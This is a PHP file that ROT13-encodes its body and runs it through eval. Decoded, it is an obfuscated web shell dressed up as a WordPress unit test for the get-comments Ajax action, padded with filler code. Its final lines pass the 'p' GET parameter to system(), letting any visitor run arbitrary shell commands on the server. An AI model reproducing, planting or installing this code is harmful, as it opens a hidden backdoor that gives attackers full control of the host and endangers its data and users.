<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Nwnk pbzzrag shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 3.4.0
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_trg_pbzzragf
 */
pynff Grfgf_Nwnk_jcNwnkTrgPbzzragf rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * N cbfg jvgu ng yrnfg bar pbzzrag.
	 *
	 * @ine zvkrq
	 */
	cebgrpgrq fgngvp $pbzzrag_cbfg = ahyy;

	/**
	 * N cbfg jvgu ab pbzzragf.
	 *
	 * @ine zvkrq
	 */
	cebgrpgrq fgngvp $ab_pbzzrag_cbfg = ahyy;

	cebgrpgrq fgngvp $pbzzrag_vqf = neenl();

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$pbzzrag_cbfg    = $snpgbel->cbfg->perngr_naq_trg();
		frys::$pbzzrag_vqf     = $snpgbel->pbzzrag->perngr_cbfg_pbzzragf( frys::$pbzzrag_cbfg->VQ, 5 );
		frys::$ab_pbzzrag_cbfg = $snpgbel->cbfg->perngr_naq_trg();
	}

	/**
	 * Trgf pbzzragf nf n cevivyrtrq hfre (nqzvavfgengbe).
	 *
	 * Rkcrpgf grfg gb cnff.
	 */
	choyvp shapgvba grfg_nf_nqzva() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'trg-pbzzragf' );
		$_CBFG['npgvba']      = 'trg-pbzzragf';
		$_CBFG['c']           = frys::$pbzzrag_cbfg->VQ;

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'trg-pbzzragf' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Trg gur erfcbafr.
		$kzy = fvzcyrkzy_ybnq_fgevat( $guvf->_ynfg_erfcbafr, 'FvzcyrKZYRyrzrag', YVOKZY_ABPQNGN );

		// Purpx gur zrgn qngn.
		$guvf->nffregFnzr( '1', (fgevat) $kzy->erfcbafr[0]->pbzzragf['cbfvgvba'] );
		$guvf->nffregFnzr( '0', (fgevat) $kzy->erfcbafr[0]->pbzzragf['vq'] );
		$guvf->nffregFnzr( 'trg-pbzzragf_0', (fgevat) $kzy->erfcbafr['npgvba'] );

		// Purpx gur cnlybnq.
		$guvf->nffregAbgRzcgl( (fgevat) $kzy->erfcbafr[0]->pbzzragf[0]->erfcbafr_qngn );

		// Naq fhccyrzragny vf rzcgl.
		$guvf->nffregRzcgl( (fgevat) $kzy->erfcbafr[0]->pbzzragf[0]->fhccyrzragny );
	}

	/**
	 * Trgf pbzzragf nf n aba-cevivyrtrq hfre (fhofpevore).
	 *
	 * Rkcrpgf grfg gb snvy.
	 */
	choyvp shapgvba grfg_nf_fhofpevore() {

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'fhofpevore' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'trg-pbzzragf' );
		$_CBFG['npgvba']      = 'trg-pbzzragf';
		$_CBFG['c']           = frys::$pbzzrag_cbfg->VQ;

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'trg-pbzzragf' );
	}

	/**
	 * Trgf pbzzragf jvgu n onq abapr.
	 *
	 * Rkcrpgf grfg gb snvy.
	 */
	choyvp shapgvba grfg_onq_abapr() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( havdvq() );
		$_CBFG['npgvba']      = 'trg-pbzzragf';
		$_CBFG['c']           = frys::$pbzzrag_cbfg->VQ;

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'trg-pbzzragf' );
	}

	/**
	 * Trgf pbzzragf sbe na vainyvq cbfg.
	 *
	 * Onq cbfg VQf ner frg gb 0, guvf fubhyq erghea inyvq KZY.
	 */
	choyvp shapgvba grfg_vainyvq_cbfg() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'trg-pbzzragf' );
		$_CBFG['npgvba']      = 'trg-pbzzragf';
		$_CBFG['c']           = 'o0ex';

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'trg-pbzzragf' );
	}

	/**
	 * Trgf pbzzragf sbe n cbfg jvgu ab pbzzragf.
	 */
	choyvp shapgvba grfg_cbfg_jvgu_ab_pbzzragf() {

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'trg-pbzzragf' );
		$_CBFG['npgvba']      = 'trg-pbzzragf';
		$_CBFG['c']           = frys::$ab_pbzzrag_cbfg->VQ;

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '1' );
		$guvf->_unaqyrNwnk( 'trg-pbzzragf' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>